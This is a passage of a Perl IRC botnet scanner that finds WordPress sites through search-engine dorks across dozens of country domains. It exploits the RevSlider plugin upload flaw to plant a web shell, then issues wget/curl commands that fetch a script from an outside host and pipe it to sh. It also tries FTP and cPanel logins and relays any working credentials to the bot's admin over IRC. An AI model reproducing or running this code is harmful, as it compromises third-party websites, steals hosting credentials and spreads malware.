		&msg("$chan","$logo(7@2$engine15) 13FTP trying...");
		&msg("$chan","$logo(7@2$engine15) 13cPanel trying...");
		&ftp_connect($host,$dork,$user,$pass,$chan,$engine,$logo,$nick); sleep(2);
		&cp_connect($host,$dork,$user,$pass,$chan,$engine,$logo); sleep(2);
	}
}

sub ftp_connect() {
	my $host = $_[0];
	my $dork = $_[1];
	my $user = $_[2];
	my $pass = $_[3];
	my $chan = $_[4];
	my $engine = $_[5];
	my $logo = $_[6];
	my $nick = $_[7];
	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
	my $success = 1;
	use Net::FTP;
	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 7);
		$success = 0 if $ftp->login($user,$pass);
		$ftp->quit;
		if ($success == 0) {
		&msg("$chan","$logo(7@2$engine15) 4FTP Connected!  5Sent To $nick ");
		if ($nick eq $admin) {
		&msg("$admin","$logo(7@2$engine15) 4FTP Connected 15( 12ftp://".$host." 6".$user." 13:6 ".$pass." 15) 14Dork: $dork");
		} else {
		&msg("$nick","$logo(7@2$engine15) 4FTP Connected 15( 12ftp://".$host." 6".$user." 13:6 ".$pass." 15) 14Dork: $dork");
		&msg("$admin","$logo(7@2$engine15) 4FTP Connected 15( 12ftp://".$host." 6".$user." 13:6 ".$pass." 15) 14Dork: $dork 15by: $nick");
		}
	}
} exit;
}
}
					
sub cp_connect() {
	my $host = $_[0];
	my $dork = $_[1];
	my $user = $_[2];
	my $pass = $_[3];
	my $chan = $_[4];
	my $engine = $_[5];
	my $logo = $_[6];
	
	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
	my $cp  = "ftp://$user:$pass@".$host."";
	my $cpanel  = &get_content($cp);
                if ($cpanel =~ /ftp/){
		&msg("$chan","$logo(7@2$engine15) 4cPanel Connected!");
		if ($nick eq $admin) {
		&msg("$admin","$logo(7@2$engine15) 4cPanel Connected 15( 2".$host."/controlpanel 7".$user." 13:7 ".$pass." 15) 14Dork: $dork");
		} else {
		#&msg("$nick","$logo(7@2$engine15) 4cPanel Connected 15( 2".$host."/controlpanel 7".$user." 13:7 ".$pass." 15) 14Dork: $dork");
		&msg("$admin","$logo(7@2$engine15) 4cPanel Connected 15( 2".$host."/controlpanel 7".$user." 13:7 ".$pass." 15) 14Dork: $dork 15by: $nick");
		}
	}
} exit;
}
}		

sub upload() {
	my $url = $_[0];
	my $dork = $_[1];
	my $chan = $_[2];
	my $engine = $_[3];
	my $logo = $_[4];
	my $nick = $_[5];
	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
			my $vuln = "http://".$url."wp-admin/admin-ajax.php";
			my $manual = "http://".$url."wp-content/plugins/revslider/temp/update_extract/revslider.zip;unzip revslider.zip";
			my $shell = "http://".$url."wp-content/plugins/revslider/temp/update_extract/revslider/joss.php";
			my $pbots = "http://".$url."wp-content/plugins/revslider/temp/update_extract/revslider/pbot.php";
			my $uan = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
			$uan->timeout(10);
			$uan->agent($useragent);
			my $status = $uan->get("$vuln");
			
			my $exploit = $uan->post("$vuln", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);
			if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
			&msg("$chan","$logo(7@2$engine15) 14Payload successfully executed ");
			my $unzip = &get_content($manual);
		sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
		my $rndstr = rndstr(8, 1..9, 'a'..'z');
		my $cmd1 = encode_base64("echo $rndstr");
		my $status = $uan->get("$shell?cmd=$cmd1");
		if ($status->decoded_content =~ /system\(\) has been disabled/) {
		&msg("$chan","$logo(7@2$engine15) 14Xploit failed: system() has been disabled");exit;
		}elsif ($status->decoded_content !~ /$rndstr/) {
		&msg("$chan","$logo(7@2$engine15) 6Xploit success: " . $status->status_line . "");
		
	my $target = &get_content($shell."?bajak");
	if ($target =~ /SexCrime - Shell/i) { 
	&os($shell,$chan,$dork,$engine,$logo,$nick,$url);	
	}
	if ($spread == 1) { &get_content($pbots,2); }

	}
	}
	elsif ($exploit->decoded_content =~ /Wrong request/) {&msg("$chan","$logo(7@2$engine15) 14Payload failed: Not vulnerable ");exit;}
	elsif ($exploit->decoded_content =~ m/0$/) {&msg("$chan","$logo(7@2$engine15) 14Payload failed: Plugin unavailable ");exit;}
	#else {$exploit->decoded_content =~ /<\/b>(.*?)<br>/; &msg("$chan","$logo(7@2$engine15) 14Payload failed: $1 ");exit;}
			
	}exit;
	}
}

sub os() {
	my $url = $_[0];
	my $chan = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $logo = $_[4];
	my $nick = $_[5];
	my $url2 = $_[6];
	my @print;
	my $target = &get_content($url."?bajak");
	if ($target =~ m/Shell : Bispak/) { 
	my $target = &get_content($url."?cmd=".$c99.$botxx,7);
	my $target = &get_content($url."bot.php");
	my $target = &get_content($url."?cmd=wget%20-qO%20-%20http://www.viverosgimeno.es/wp-content/rac/bss.txt%20|%20sh%20>%20/dev/null%202>&1%20&");
	my $target = &get_content($url."?cmd=wget%20-qO%20-%20http://www.viverosgimeno.es/wp-content/rac/bss.txt%20|%20sh%20>%20/dev/null%202>&1%20&");
	my $target = &get_content($url."?cmd=curl%20http://www.viverosgimeno.es/wp-content/rac/bss.txt%20|%20sh%20>%20/dev/null%202>&1%20&");
	my $target = &get_content($url."?cmd=curl%20http://www.viverosgimeno.es/wp-content/rac/bss.txt%20|%20sh%20>%20/dev/null%202>&1%20&");
	my $target = &get_content($url."?hta");
		my $safe = ""; my $os = ""; my $uid = "";
	if ($target =~ m/Shell : (.*?)<\/b>/){$safe=$1;}
	if ($target =~ m/Sistem : (.*?)<\/b>/){$os=$1;}
	if ($target =~ m/id=(.*?)grup=(.*?)/){$uid=$1;}
		&msg("$chan","$logo(7@2$engine15) 4Exploited! Shell $safe 5Sent To $nick 3$os 7Pengguna= $uid ");
		if ($nick eq $admin) {
		&msg("$admin","$logo(7@2$engine15) 4Shell $safe 12".$url." 3$os 7Pengguna=$uid 14Dork: $dork");
		} else {
		&msg("$nick","$logo(7@2$engine15) 4Shell $safe 12".$url." 3$os 7Pengguna=$uid 14Dork: $dork");
		&msg("$admin","$logo(7@2$engine15) 4Shell $safe 12".$url." 3$os 7Pengguna=$uid 14Dork: $dork 15by: $nick");
		}					
	} 
	my $c99shell = "http://".$url2."wp-includes/log.php";
	my $cgiperl = "http://".$url2."wp-indeks.php";
	my $cekc99 = &get_content($c99shell,7);
	my $cekcgi = &get_content($cgiperl,7);
	
	if ($cekc99 =~ /Password:/) {
		if ($pubscan == 0) {
			&msg("$admin","$logo(7@2$engine15) 4<9=4>4 c99 4<9=4>12 $c99shell15 ");
			}
		}
	if ($cekcgi =~ /SexCrime - Shell/) {
		if ($pubscan == 0) {
			&msg("$admin","$logo(7@2$engine15) 4<9=4>4 Backup 4<9=4>11 $cgiperl15 ");
			}
		}
	if ($target =~ m/Shell : Kontol/) { 
	&msg("$chan","$logo(7@2$engine15) 4Shell Kontol 12".$url."");
	}
	
	return @print;
}

#########################################	Searching site...

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
    if ($engine eq "UAE") { my @uae = jack1($dork."+site:ae"); push(@total,@uae); }
    if ($engine eq "Myanmar") { my @myanmar = jack2($dork."+site:mm"); push(@total,@myanmar); }
    if ($engine eq "Argentina") { my @argentina = jack3($dork."+site:ar"); push(@total,@argentina); }
    if ($engine eq "Austria") { my @austria = jack4($dork."+site:at"); push(@total,@austria); }
    if ($engine eq "Australia") { my @australia = jack5($dork."+site:au"); push(@total,@australia); }
    if ($engine eq "Brazil") { my @brazil = jack6($dork."+site:br"); push(@total,@brazil); }
    if ($engine eq "Canada") { my @canada = jack7($dork."+site:ca"); push(@total,@canada); }
    if ($engine eq "Chili") { my @chili = jack8($dork."+site:cl"); push(@total,@chili); }
    if ($engine eq "Cina") { my @cina = jack9($dork."+site:cn"); push(@total,@cina); }
    if ($engine eq "CoMersil") { my @comersil = jack10($dork."+site:com"); push(@total,@comersil); }
    if ($engine eq "Czech") { my @czech = jack11($dork."+site:cz"); push(@total,@czech); }
    if ($engine eq "Germany") { my @germany = jack12($dork."+site:de"); push(@total,@germany); }
    if ($engine eq "Denmark") { my @denmark = jack13($dork."+site:dk"); push(@total,@denmark); }
    if ($engine eq "Spain") { my @spain = jack14($dork."+site:es"); push(@total,@spain); }
    if ($engine eq "Europe") { my @europe = jack15($dork."+site:eu"); push(@total,@europe); }
    if ($engine eq "France") { my @france = jack16($dork."+site:fr"); push(@total,@france); }
    if ($engine eq "Hungary") { my @hungary = jack17($dork."+site:hu"); push(@total,@hungary); }
    if ($engine eq "Indonesia") { my @indonesia = jack18($dork."+site:id"); push(@total,@indonesia); }
    if ($engine eq "Israel") { my @israel = jack19($dork."+site:il"); push(@total,@israel); }
    if ($engine eq "India") { my @india = jack20($dork."+site:in"); push(@total,@india); }
    if ($engine eq "Info") { my @info = jack1($dork."+site:info"); push(@total,@info); }
    if ($engine eq "Iran") { my @iran = jack2($dork."+site:ir"); push(@total,@iran); }
    if ($engine eq "Italy") { my @italy = jack3($dork."+site:it"); push(@total,@italy); }
    if ($engine eq "Japan") { my @japan = jack4($dork."+site:jp"); push(@total,@japan); }
    if ($engine eq "Korea") { my @korea = jack5($dork."+site:kr"); push(@total,@korea); }
    if ($engine eq "Mexico") { my @mexico = jack6($dork."+site:mx"); push(@total,@mexico); }
    if ($engine eq "Malaysia") { my @malaysia = jack7($dork."+site:my"); push(@total,@malaysia); }
    if ($engine eq "Network") { my @network = jack8($dork."+site:net"); push(@total,@network); }
    if ($engine eq "Netherlands") { my @netherlands = jack9($dork."+site:nl"); push(@total,@netherlands); }
    if ($engine eq "Organization") { my @organization = jack10($dork."+site:org"); push(@total,@organization); }
    if ($engine eq "Philippines") { my @philippines = jack11($dork."+site:ph"); push(@total,@philippines); }
    if ($engine eq "Poland") { my @poland = jack12($dork."+site:pl"); push(@total,@poland); }
    if ($engine eq "Romania") { my @romania = jack13($dork."+site:ro"); push(@total,@romania); }
    if ($engine eq "Russian") { my @russian = jack14($dork."+site:ru"); push(@total,@russian); }
    if ($engine eq "Thailand") { my @thailand = jack14($dork."+site:th"); push(@total,@thailand); }
    if ($engine eq "Ukraine") { my @ukraine = jack16($dork."+site:ua"); push(@total,@ukraine); }
    if ($engine eq "England") { my @england = jack17($dork."+site:uk"); push(@total,@england); }
    if ($engine eq "USA") { my @usa = jack18($dork."+site:us"); push(@total,@usa); }
    if ($engine eq "Slovenia") { my @slovenia = jack19($dork."+site:si"); push(@total,@slovenia); }
    if ($engine eq "Belgium") { my @belgium = jack20($dork."+site:be"); push(@total,@belgium); }
    if ($engine eq "Bussines") { my @bussines = jack1($dork."+site:biz"); push(@total,@bussines); }		
    if ($engine eq "SouthAfrica") { my @southafrica = jack2($dork."+site:za"); push(@total,@southafrica); }
    if ($engine eq "Vietnam") { my @vietnam = jack3($dork."+site:vn"); push(@total,@vietnam); }
    if ($engine eq "Tuvalu") { my @tuvalu = jack4($dork."+site:tv"); push(@total,@tuvalu); }
    if ($engine eq "Cocos") { my @cocos = jack5($dork."+site:cc"); push(@total,@cocos); }
    if ($engine eq "Turky") { my @turky = jack6($dork."+site:tr"); push(@total,@turky); }
    if ($engine eq "Asia") { my @asia = jack7($dork."+site:asia"); push(@total,@asia); }
    if ($engine eq "Serbia") { my @serbia = jack8($dork."+site:rs"); push(@total,@serbia); }
    if ($engine eq "Singapore") { my @singapore = jack9($dork."+site:sg"); push(@total,@singapore); }
    if ($engine eq "Taiwan") { my @taiwan = jack10($dork."+site:tw"); push(@total,@taiwan); }
    if ($engine eq "Sweden") { my @sweden = jack11($dork."+site:se"); push(@total,@sweden); }
    if ($engine eq "Pakistan") { my @pakistan = jack12($dork."+site:pk"); push(@total,@pakistan); }
    if ($engine eq "Norway") { my @normay = jack13($dork."+site:no"); push(@total,@norway); }
    if ($engine eq "Montenegro") { my @montenegro = jack14($dork."+site:me"); push(@total,@montenegro); }	
    if ($engine eq "Greece") { my @greece = jack15($dork."+site:gr"); push(@total,@greece); }
    if ($engine eq "Education") { my @education = jack16($dork."+site:edu"); push(@total,@education); }
    if ($engine eq "Goverment") { my @goverment = jack17($dork."+site:gov"); push(@total,@goverment); }
    if ($engine eq "Kazakhstan") { my @kazakhstan = jack18($dork."+site:kz"); push(@total,@kazakhstan); }
    if ($engine eq "Afganistan") { my @afganistan = jack19($dork."+site:af"); push(@total,@afganistan); }
    if ($engine eq "Albania") { my @albania = jack20($dork."+site:al"); push(@total,@albania); }
    if ($engine eq "Algeria") { my @algeria = jack1($dork."+site:dz"); push(@total,@algeria); }
    if ($engine eq "Angola") { my @angola = jack2($dork."+site:ao"); push(@total,@angola); }
    if ($engine eq "Armenia") { my @armenia = jack3($dork."+site:am"); push(@total,@armenia); }
    if ($engine eq "Azerbaijan") { my @azerbaijan = jack4($dork."+site:az"); push(@total,@azerbaijan); }
    if ($engine eq "Bahrain") { my @bahrain = jack5($dork."+site:bh"); push(@total,@bahrain); }
    if ($engine eq "Bangladesh") { my @bangladesh = jack6($dork."+site:bd"); push(@total,@bangladesh); }
    if ($engine eq "Belarus") { my @belarus = jack7($dork."+site:by"); push(@total,@belarus); }
    if ($engine eq "Bhutan") { my @bhutan = jack8($dork."+site:bt"); push(@total,@bhutan); }
    if ($engine eq "Bolivia") { my @bolivia = jack9($dork."+site:bo"); push(@total,@bolivia); }
    if ($engine eq "Bosnia") { my @bosnia = jack10($dork."+site:ba"); push(@total,@bosnia); }
    if ($engine eq "Bulgaria") { my @bulgaria = jack12($dork."+site:bg"); push(@total,@bulgaria); }
    if ($engine eq "Brunei") { my @brunei = jack13($dork."+site:bn"); push(@total,@brunei); }
    if ($engine eq "Cambodia") { my @cambodia = jack14($dork."+site:kh"); push(@total,@cambodia); }
    if ($engine eq "Cameroon") { my @cameroon = jack11($dork."+site:cm"); push(@total,@cameroon); }
    if ($engine eq "Christmas") { my @christmas = jack15($dork."+site:cx"); push(@total,@christmas); }
    if ($engine eq "CostaRika") { my @costarika = jack16($dork."+site:cr"); push(@total,@costarika); }
    if ($engine eq "Croatia") { my @croatia = jack17($dork."+site:hr"); push(@total,@croatia); }
    if ($engine eq "Cuba") { my @cuba = jack18($dork."+site:cu"); push(@total,@cuba); }
    if ($engine eq "Cyprus") { my @cyprus = jack19($dork."+site:cy"); push(@total,@cyprus); }
    if ($engine eq "Dominican") { my @dominican = jack20($dork."+site:dm"); push(@total,@dominican); }
    if ($engine eq "Equador") { my @equador = jack1($dork."+site:ec"); push(@total,@equador); }
    if ($engine eq "Egypt") { my @egypt = jack2($dork."+site:eg"); push(@total,@egypt); }
    if ($engine eq "Estonia") { my @estonia = jack3($dork."+site:ee"); push(@total,@estonia); }
    if ($engine eq "Finland") { my @finland = jack4($dork."+site:fi"); push(@total,@finland); }
    if ($engine eq "Georgia") { my @georgia = jack5($dork."+site:ge"); push(@total,@georgia); }
    if ($engine eq "Ghana") { my @ghana = jack6($dork."+site:gh"); push(@total,@ghana); }
    if ($engine eq "Grenada") { my @grenada = jack7($dork."+site:gd"); push(@total,@grenada); }
    if ($engine eq "Honduras") { my @honduras = jack8($dork."+site:hn"); push(@total,@honduras); }
    if ($engine eq "Hongkong") { my @hongkong = jack9($dork."+site:hk"); push(@total,@hongkong); }
    if ($engine eq "Iceland") { my @iceland = jack10($dork."+site:is"); push(@total,@iceland); }
    if ($engine eq "Ireland") { my @ireland = jack12($dork."+site:ie"); push(@total,@ireland); }
    if ($engine eq "Kenya") { my @kenya = jack13($dork."+site:ke"); push(@total,@kenya); }
    if ($engine eq "Kuwait") { my @kuwait = jack14($dork."+site:kw"); push(@total,@kuwait); }
    if ($engine eq "Laos") { my @laos = jack16($dork."+site:la"); push(@total,@laos); }
    if ($engine eq "Latvia") { my @latvia = jack17($dork."+site:lv"); push(@total,@latvia); }
    if ($engine eq "Liberia") { my @liberia = jack18($dork."+site:lr"); push(@total,@liberia); }
    if ($engine eq "Libyan") { my @libyan = jack19($dork."+site:ly"); push(@total,@libyan); }
    if ($engine eq "Lithuania") { my @lithuania = jack11($dork."+site:lt"); push(@total,@lithuania); }
    if ($engine eq "Macedonia") { my @macedonia = jack15($dork."+site:mk"); push(@total,@macedonia); }		
    if ($engine eq "Malta") { my @malta = jack1($dork."+site:mt"); push(@total,@malta); }
    if ($engine eq "Mongolia") { my @mongolia = jack2($dork."+site:mn"); push(@total,@mongolia); }
    if ($engine eq "Mozambique") { my @mozambique = jack3($dork."+site:mz"); push(@total,@mozambique); }
    if ($engine eq "Namibia") { my @namibia = jack4($dork."+site:na"); push(@total,@namibia); }
    if ($engine eq "Nauru") { my @nauru = jack6($dork."+site:nr"); push(@total,@nauru); }
    if ($engine eq "Nepal") { my @nepal = jack7($dork."+site:np"); push(@total,@nepal); }
    if ($engine eq "NewZealand") { my @newzealand = jack8($dork."+site:nz"); push(@total,@newzealand); }
    if ($engine eq "Nigeria") { my @nigeria = jack9($dork."+site:ng"); push(@total,@nigeria); }
    if ($engine eq "Paraguay") { my @paraguay = jack10($dork."+site:py"); push(@total,@paraguay); }
    if ($engine eq "Peru") { my @peru = jack5($dork."+site:pe"); push(@total,@peru); }
    if ($engine eq "Portugal") { my @portugal = jack11($dork."+site:pt"); push(@total,@portugal); }
    if ($engine eq "PuertoRico") { my @puertorico = jack12($dork."+site:pr"); push(@total,@puertorico); }
    if ($engine eq "Qatar") { my @qatar = jack13($dork."+site:qa"); push(@total,@qatar); }	
    if ($engine eq "SaintLucia") { my @saintlucia = jack14($dork."+site:lc"); push(@total,@saintlucia); }
    if ($engine eq "Samoa") { my @samoa = jack15($dork."+site:ws"); push(@total,@samoa); }
    if ($engine eq "SaudiArabia") { my @saudiarabia = jack17($dork."+site:sa"); push(@total,@saudiarabia); }
    if ($engine eq "Senegal") { my @senegal = jack18($dork."+site:sn"); push(@total,@senegal); }
    if ($engine eq "Slovakia") { my @slovakia = jack16($dork."+site:sk"); push(@total,@slovakia); }
    if ($engine eq "Srilanka") { my @srilanka = jack19($dork."+site:lk"); push(@total,@srilanka); }
    if ($engine eq "Swaziland") { my @swaziland = jack20($dork."+site:sz"); push(@total,@swaziland); }
    if ($engine eq "Tajikistan") { my @tajikistan = jack1($dork."+site:tj"); push(@total,@tajikistan); }
    if ($engine eq "Tanzania") { my @tanzania = jack2($dork."+site:tz"); push(@total,@tanzania); }
    if ($engine eq "Tokelau") { my @tokelau = jack3($dork."+site:tk"); push(@total,@tokelau); }
    if ($engine eq "Tonga") { my @tonga = jack4($dork."+site:to"); push(@total,@tonga); }
    if ($engine eq "Tunisia") { my @tunisia = jack5($dork."+site:tn"); push(@total,@tunisia); }		
    if ($engine eq "Uruguay") { my @uruguay = jack6($dork."+site:uy"); push(@total,@uruguay); }
    if ($engine eq "Uzbekistan") { my @uzbekistan = jack7($dork."+site:uz"); push(@total,@uzbekistan); }
    if ($engine eq "Venezuela") { my @venezuela = jack8($dork."+site:ve"); push(@total,@venezuela); }
    if ($engine eq "Yemen") { my @yemen = jack9($dork."+site:ye"); push(@total,@yemen); }
    if ($engine eq "Yugoslavia") { my @yugoslavia = jack10($dork."+site:yu"); push(@total,@yugoslavia); }
    if ($engine eq "Zambia") { my @zambia = jack11($dork."+site:zm"); push(@total,@zambia); }
    if ($engine eq "Uganda") { my @uganda = jack12($dork."+site:ug"); push(@total,@uganda); }
    if ($engine eq "Trinidad") { my @trinidad = jack13($dork."+site:tt"); push(@total,@trinidad); }
    if ($engine eq "Zimbabwe") { my @zimbabwe = jack14($dork."+site:zw"); push(@total,@zimbabwe); }
    if ($engine eq "KonToL") { my @kontol = kontol($dork); push(@total,@kontol); }
    if ($engine eq "PePek") { my @pepek = pepek($dork); push(@total,@pepek); }
    if ($engine eq "TeTek") { my @tetek = tetek($dork); push(@total,@tetek); }
    if ($engine eq "ItiL") { my @itil = itil($dork); push(@total,@itil); }
    if ($engine eq "NenNen") { my @nennen = nennen($dork); push(@total,@nennen); }
    if ($engine eq "SuSu") { my @susu = susu($dork); push(@total,@susu); }
    if ($engine eq "BuahDada") { my @buahdada = buahdada($dork); push(@total,@buahdada); }
    if ($engine eq "PayuDara") { my @payudara = payudara($dork); push(@total,@payudara); }
    if ($engine eq "Kentot") { my @kentot = kentot($dork); push(@total,@kentot); }
    if ($engine eq "eMeL") { my @emel = emel($dork); push(@total,@emel); }
    if ($engine eq "OraL") { my @oral = oral($dork); push(@total,@oral); }
    if ($engine eq "Klitoris") { my @klitoris = klitoris($dork); push(@total,@klitoris); }
    if ($engine eq "Masturbasi") { my @masturbasi = masturbasi($dork); push(@total,@masturbasi); }
    if ($engine eq "Onani") { my @onani = onani($dork); push(@total,@onani); }	
    if ($engine eq "Sperma") { my @sperma = sperma($dork); push(@total,@sperma); }		
    if ($engine eq "AnaL") { my @anal = anal($dork); push(@total,@anal); } 
    if ($engine eq "Puting") { my @puting = puting($dork); push(@total,@puting); }	
    if ($engine eq "Vagina") { my @vagina = vagina($dork); push(@total,@vagina); }
    if ($engine eq "Penis") { my @penis = penis($dork); push(@total,@penis); }
    if ($engine eq "MeMek") { my @memek = memek($dork); push(@total,@memek); }
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "GooGLeCA") { my @googleCA = googleCA($dork); push(@total,@googleCA); }
    if ($engine eq "GooGLeDE") { my @googleDE = googleDE($dork); push(@total,@googleDE); }
    if ($engine eq "GooGLeUK") { my @googleUK = googleUK($dork); push(@total,@googleUK); }
    if ($engine eq "GooGLeFR") { my @googleFR = googleFR($dork); push(@total,@googleFR); }
    if ($engine eq "GooGLeES") { my @googleES = googleES($dork); push(@total,@googleES); }
    if ($engine eq "GooGLeIT") { my @googleIT = googleIT($dork); push(@total,@googleIT); }
    if ($engine eq "GooGLeNL") { my @googleNL = googleNL($dork); push(@total,@googleNL); }
    if ($engine eq "GooGLeBE") { my @googleBE = googleBE($dork); push(@total,@googleBE); }
    if ($engine eq "GooGLeCH") { my @googleCH = googleCH($dork); push(@total,@googleCH); }
    if ($engine eq "GooGLeSE") { my @googleSE = googleSE($dork); push(@total,@googleSE); }
    if ($engine eq "GooGLeDK") { my @googleDK = googleDK($dork); push(@total,@googleDK); }
    if ($engine eq "GooGLeNO") { my @googleNO = googleNO($dork); push(@total,@googleNO); }
    if ($engine eq "GooGLeNZ") { my @googleNZ = googleNZ($dork); push(@total,@googleNZ); }
    if ($engine eq "GooGLeIE") { my @googleIE = googleIE($dork); push(@total,@googleIE); }
    if ($engine eq "GooGLeBR") { my @googleBR = googleBR($dork); push(@total,@googleBR); }
    if ($engine eq "GooGLeAR") { my @googleAR = googleAR($dork); push(@total,@googleAR); }
    if ($engine eq "GooGLeCO") { my @googleCO = googleCO($dork); push(@total,@googleCO); }
    if ($engine eq "GooGLeCU") { my @googleCU = googleCU($dork); push(@total,@googleCU); }
    if ($engine eq "GooGLeCL") { my @googleCL = googleCL($dork); push(@total,@googleCL); }
    if ($engine eq "GooGLeMX") { my @googleMX = googleMX($dork); push(@total,@googleMX); }
    if ($engine eq "GooGLeAU") { my @googleAU = googleAU($dork); push(@total,@googleAU); }
    if ($engine eq "GooGLeRU") { my @googleRU = googleRU($dork); push(@total,@googleRU); }
    if ($engine eq "GooGLeAT") { my @googleAT = googleAT($dork); push(@total,@googleAT); }
    if ($engine eq "GooGLePL") { my @googlePL = googlePL($dork); push(@total,@googlePL); }
    if ($engine eq "GooGLeIL") { my @googleIL = googleIL($dork); push(@total,@googleIL); }
    if ($engine eq "GooGLeTR") { my @googleTR = googleTR($dork); push(@total,@googleTR); }
    if ($engine eq "GooGLeUA") { my @googleUA = googleUA($dork); push(@total,@googleUA); }
    if ($engine eq "GooGLeGR") { my @googleGR = googleGR($dork); push(@total,@googleGR); }
    if ($engine eq "GooGLeJP") { my @googleJP = googleJP($dork); push(@total,@googleJP); }
    if ($engine eq "GooGLeCN") { my @googleCN = googleCN($dork); push(@total,@googleCN); }
    if ($engine eq "GooGLeMY") { my @googleMY = googleMY($dork); push(@total,@googleMY); }
    if ($engine eq "GooGLeTH") { my @googleTH = googleTH($dork); push(@total,@googleTH); }
    if ($engine eq "GooGLeIN") { my @googleIN = googleIN($dork); push(@total,@googleIN); }
    if ($engine eq "GooGLeKR") { my @googleKR = googleKR($dork); push(@total,@googleKR); }
    if ($engine eq "GooGLeRO") { my @googleRO = googleRO($dork); push(@total,@googleRO); }
    if ($engine eq "GooGLeTW") { my @googleTW = googleTW($dork); push(@total,@googleTW); }
    if ($engine eq "GooGLeZA") { my @googleZA = googleZA($dork); push(@total,@googleZA); }
    if ($engine eq "GooGLePT") { my @googlePT = googlePT($dork); push(@total,@googlePT); }
    if ($engine eq "AsKCA") { my @askCA = askCA($dork); push(@total,@askCA); }
    if ($engine eq "AsKDE") { my @askDE = askDE($dork); push(@total,@askDE); }
    if ($engine eq "AsKIT") { my @askIT = askIT($dork); push(@total,@askIT); }
    if ($engine eq "AsKUK") { my @askUK = askUK($dork); push(@total,@askUK); }
    if ($engine eq "AsKFR") { my @askFR = askFR($dork); push(@total,@askFR); }
    if ($engine eq "AsKES") { my @askES = askES($dork); push(@total,@askES); }
    if ($engine eq "AsKRU") { my @askRU = askRU($dork); push(@total,@askRU); }
    if ($engine eq "AsKNL") { my @askNL = askNL($dork); push(@total,@askNL); }
    if ($engine eq "AsKEU") { my @askEU = askEU($dork); push(@total,@askEU); }
    if ($engine eq "AsKPL") { my @askPL = askPL($dork); push(@total,@askPL); }
    if ($engine eq "AsKAT") { my @askAT = askAT($dork); push(@total,@askAT); }
    if ($engine eq "AsKSE") { my @askSE = askSE($dork); push(@total,@askSE); }
    if ($engine eq "AsKDK") { my @askDK = askDK($dork); push(@total,@askDK); }
    if ($engine eq "AsKNO") { my @askNO = askNO($dork); push(@total,@askNO); }
    if ($engine eq "AsKAU") { my @askAU = askAU($dork); push(@total,@askAU); }
    if ($engine eq "AsKBR") { my @askBR = askBR($dork); push(@total,@askBR); }
    if ($engine eq "AsKMX") { my @askMX = askMX($dork); push(@total,@askMX); }
    if ($engine eq "AsKJP") { my @askJP = askJP($dork); push(@total,@askJP); }
    if ($engine eq "BingDE") { my @bingDE = bingDE($dork); push(@total,@bingDE); }
    if ($engine eq "BingUK") { my @bingUK = bingUK($dork); push(@total,@bingUK); }
    if ($engine eq "BingCA") { my @bingCA = bingCA($dork); push(@total,@bingCA); }
    if ($engine eq "BingBR") { my @bingBR = bingBR($dork); push(@total,@bingBR); }
    if ($engine eq "BingFR") { my @bingFR = bingFR($dork); push(@total,@bingFR); }
    if ($engine eq "BingES") { my @bingES = bingES($dork); push(@total,@bingES); }
    if ($engine eq "BingIT") { my @bingIT = bingIT($dork); push(@total,@bingIT); }
    if ($engine eq "BingBE") { my @bingBE = bingBE($dork); push(@total,@bingBE); }
    if ($engine eq "BingNL") { my @bingNL = bingNL($dork); push(@total,@bingNL); }
    if ($engine eq "BingPT") { my @bingPT = bingPT($dork); push(@total,@bingPT); }
    if ($engine eq "BingNO") { my @bingNO = bingNO($dork); push(@total,@bingNO); }
    if ($engine eq "BingDK") { my @bingDK = bingDK($dork); push(@total,@bingDK); }
    if ($engine eq "BingSE") { my @bingSE = bingSE($dork); push(@total,@bingSE); }
    if ($engine eq "BingCH") { my @bingCH = bingCH($dork); push(@total,@bingCH); }
    if ($engine eq "BingNZ") { my @bingNZ = bingNZ($dork); push(@total,@bingNZ); }
    if ($engine eq "BingRU") { my @bingRU = bingRU($dork); push(@total,@bingRU); }
    if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@total,@bingJP); }
    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@total,@bingCN); }
    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@total,@bingKR); }
    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@total,@bingMX); }
    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@total,@bingAR); }
    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@total,@bingCL); }
    if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@total,@bingAU); }
    @clean = clean(@total);
	if (@clean > 0){
    &msg("$chan","$logo(7@2$engine15)12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
    }
    return @clean;
}

#########################################

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(20);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}


######################################### SEARCH ENGINE

sub jack1() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack1.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack2() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack2.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack3() {
    my @list;
    my $key = $_[0];
